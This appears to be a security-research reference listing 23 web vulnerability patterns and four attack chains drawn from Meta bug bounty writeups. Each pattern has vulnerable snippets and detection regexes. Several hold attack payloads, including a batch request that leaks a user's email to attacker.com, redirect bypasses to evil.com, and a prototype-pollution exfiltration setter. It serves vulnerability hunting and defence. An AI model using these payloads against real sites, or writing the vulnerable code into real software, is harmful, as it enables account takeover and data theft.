# Real-World Bug Bounty Writeup Insights

Patterns extracted from 84 Meta/Facebook bug bounty writeups. Use these as high-priority search patterns during analysis.

## PostMessage Attack Patterns (Highest-Value Category)

### Pattern 1: Origin Stored as Trusted
```javascript
// VULNERABLE: event.origin stored and used later to load scripts
window.addEventListener("message", (e) => {
  trustedHost = e.origin; // No validation!
  loadScript(trustedHost + "/sdk/pixel.js");
});
```
**Detection:** `event\.origin` stored to variable/localStorage, then used in URL construction.

### Pattern 2: DOM Injection from Message Data
```javascript
// VULNERABLE: innerHTML set from cross-window message
window.addEventListener("message", (e) => {
  if (e.origin === "https://trusted.com") {
    element.innerHTML = e.data.content; // XSS even with valid origin!
  }
});
```
**Detection:** `innerHTML|outerHTML|document\.write|\.html\(` inside message event handlers.

### Pattern 3: OAuth Parameter Injection via PostMessage
```javascript
// VULNERABLE: Message body used to construct OAuth request
window.addEventListener("message", (e) => {
  const params = e.data;
  fetch(`/oauth/authorize?redirect_uri=${params.redirect_uri}&app_id=${params.app_id}`);
});
```
**Detection:** Message handler builds URLs or server requests using `event.data` properties.

### Pattern 4: Math.random() as Security Primitive
```javascript
// VULNERABLE: PRNG used for cross-window authentication
const secret = Math.random().toString(36);
iframe.contentWindow.postMessage({ secret }, "*");
// Later: trust messages with matching secret
```
**Detection:** `Math\.random\(\)` used to produce tokens, nonces, or callback identifiers.

### Pattern 5: Wildcard targetOrigin with Sensitive Data
```javascript
// VULNERABLE: tokens sent to any origin
parent.postMessage({ token: authToken, blob: signedBlob }, "*");
```
**Detection:** `postMessage\(.*,\s*['"]?\*['"]?\)` where payload contains tokens/codes.

### Pattern 6: Type Confusion in URL Validation
```javascript
// VULNERABLE: typeof check bypassed by Array
if (typeof url === "string") {
  // validate and sanitize
} else {
  window.location = url; // Array.toString() = "javascript:alert(1)"
}
```
**Detection:** `typeof.*===.*"string"` as gate before URL sinks.

---

## OAuth / Redirect URI Bypass Patterns

### Pattern 7: Path Traversal in redirect_uri
```
// Registered callback: https://app.com/callback
// Bypass: https://app.com/callback/../../open_redirect?next=evil.com
```
**Detection:** `redirect_uri.startsWith(` or `redirect_uri.includes(` without URL normalization.

### Pattern 8: Domain-Only Validation
```javascript
// VULNERABLE: checks hostname only
const url = new URL(redirect_uri);
if (url.hostname === "trusted.com") { redirect(redirect_uri); }
// Bypass: https://trusted.com/open_redirect?url=evil.com
```
**Detection:** `\.hostname\s*===` without `.pathname` validation.

### Pattern 9: HTTP Parameter Pollution
```
// Server receives: redirect_uri=legitimate.com&redirect_uri[0=evil.com
// Server uses: redirect_uri[0 (evil.com) overrides redirect_uri
```
**Detection:** Test bracket-suffix parameters `param[0=value` on OAuth endpoints.

### Pattern 10: OAuth Proxy Auto-Injecting CSRF
```javascript
// VULNERABLE: internal endpoint that proxies requests with user's CSRF token
app.get("/dialog_DONOTUSE/", (req, res) => {
  const target = req.query.url;
  fetch(target, { headers: { "X-CSRF": req.user.csrfToken } });
});
```
**Detection:** Internal proxy/relay endpoints accepting `url=` parameter that make authenticated requests.

### Pattern 11: Regex URL Manipulation Instead of URL Parser
```javascript
// VULNERABLE: regex-based URL parameter stripping
const cleanUrl = location.search.replace(/(token|code)\b[^&]*&?/g, '');
// Regex can be manipulated to relocate parameters into other values
```
**Detection:** `location\.(search|href)\.replace\(` with regex for URL manipulation.

---

## Client-Side Path Traversal (CSPT2CSRF)

### Pattern 12: Path Injection in Fetch
```javascript
// VULNERABLE: user input in URL path
const itemId = new URLSearchParams(location.search).get("id");
fetch(`/api/items/${itemId}/details`);
// Attack: ?id=../../../admin/delete-user
```
**Detection:** `fetch\(.*\$\{.*\}` or `fetch\(.*\+.*variable` where variable comes from URL params.

### Pattern 13: CSPT Chain (GET leak → POST CSRF)
```
Step 1: GET /api/items/../../user/profile → leaks CSRF token
Step 2: POST /api/items/../../user/change-email with stolen token
```
**Detection:** Any fetch/XHR with user-controlled path segments. Even read-only CSPT can enable write CSPT chains.

---

## Parser Differential / MIME Confusion

### Pattern 14: Content-Type Parsing Difference
```
Content-Type: application/json;,text/html
Server validator: sees "application/json" ✓
Browser: sees "text/html" → renders HTML → XSS
```
**Detection:** User-controlled Content-Type echoed in response header after server-side validation.

### Pattern 15: Validate-Then-Use-Original Anti-Pattern
```javascript
// VULNERABLE
const parsed = parseContentType(req.headers['content-type']);
if (parsed === 'application/json') {
  res.setHeader('Content-Type', req.headers['content-type']); // Original!
}
// SECURE
res.setHeader('Content-Type', parsed); // Parsed value
```
**Detection:** Server validates one value but uses the original unsanitized value in the response.

---

## XS-Leaks Patterns

### Pattern 16: CORB/Status Code Oracle
```javascript
// If endpoint returns different Content-Type or status based on user state:
// 200 + text/html for "user exists" → script tag loads successfully
// 200 + application/json for "user not found" → CORB blocks, onerror fires
const script = document.createElement("script");
script.src = "https://target.com/api/check?user=victim";
script.onload = () => console.log("User exists");
script.onerror = () => console.log("User not found");
```
**Detection:** Endpoints with differential responses (Content-Type, status code, body size) based on auth state.

### Pattern 17: Prototype Pollution XS-Leak
```javascript
// Before loading target script:
Object.defineProperty(Function.prototype, "default", {
  set: function(val) { exfiltrate(val.userId); }
});
// Target script does: module.exports = { userId: "12345" }
// The setter fires, leaking userId cross-origin
```
**Detection:** Globally-loaded scripts containing `export default { userId }` or `module.exports = { sensitive }`.

---

## File Upload / Content-Type Confusion

### Pattern 18: Extension vs Content-Type Mismatch
```
// Upload endpoint validates only Content-Type header:
POST /upload
Content-Type: application/pdf
filename: malicious.html  ← Extension not checked!
```
**Detection:** File upload endpoints checking `Content-Type` header but not file extension or magic bytes.

---

## GraphQL-Specific Patterns

### Pattern 19: Inconsistent ACLs Across doc_ids
```graphql
# View query (doc_id: 111) - returns limited fields
query { user(id: "123") { name, avatar } }

# Edit query (doc_id: 222) - exposes private fields
query { user(id: "123") { name, avatar, linked_ig, email, phone } }
```
**Detection:** Multiple `doc_id` values for same resource type; test edit/mutation doc_id against objects you don't own.

### Pattern 20: Batch API Result Interpolation
```json
// Batch request that exfiltrates data:
[
  {"method": "GET", "relative_url": "me?fields=email", "name": "leak"},
  {"method": "GET", "relative_url": "attacker.com/log?data={result=leak:$.email}"}
]
```
**Detection:** Batch API endpoints supporting `{result=NAME:$.field}` syntax.

### Pattern 21: actor_id Spoofing
```graphql
mutation {
  createReferral(actor_id: "VICTIM_ID", data: {...})
}
# Server uses actor_id from request body, not from session
```
**Detection:** GraphQL mutations with `actor_id`, `user_id`, `author_id` in variables — verify server binds to session.

---

## Information Disclosure Oracles

### Pattern 22: Error-State Differential
```
GET /api/orders?page_id=TARGET&state=pending
→ 200 + empty CSV = no pending orders
→ 500 = orders exist (endpoint tried to process them)
```
**Detection:** Endpoints revealing business state through differential error codes.

### Pattern 23: Expired Nonce Still Returns PII
```
GET /confirm?nonce=EXPIRED_VALUE
→ Response: "Nonce expired. Please re-send to user@victim.com"
```
**Detection:** Error/expired-state handlers that still include PII in the response body.

---

## Attack Chain Templates

### Chain A: Sandbox Escape
1. Info leak from main domain → sandbox subdomain (via URL params, referer)
2. XSS on sandbox domain (user-uploaded HTML, relaxed CSP)
3. Read leaked info from main domain context
4. Exfiltrate tokens/codes

### Chain B: Login CSRF + OAuth Theft
1. Login CSRF → force victim into attacker session
2. Trigger OAuth flow in victim's browser
3. OAuth code/token redirects to attacker's configured callback
4. Account takeover

### Chain C: PostMessage Channel Hijack
1. Bypass origin check (regex flaw, inverted check, null origin)
2. Establish MessageChannel with target
3. Request sensitive dialog URL / OAuth state
4. Steal token from dialog response

### Chain D: Self-XSS Escalation
1. Login CSRF into attacker's account (where self-XSS payload is stored)
2. Victim loads page with stored payload
3. XSS executes in victim's browser
4. Payload steals victim's real session cookies/tokens
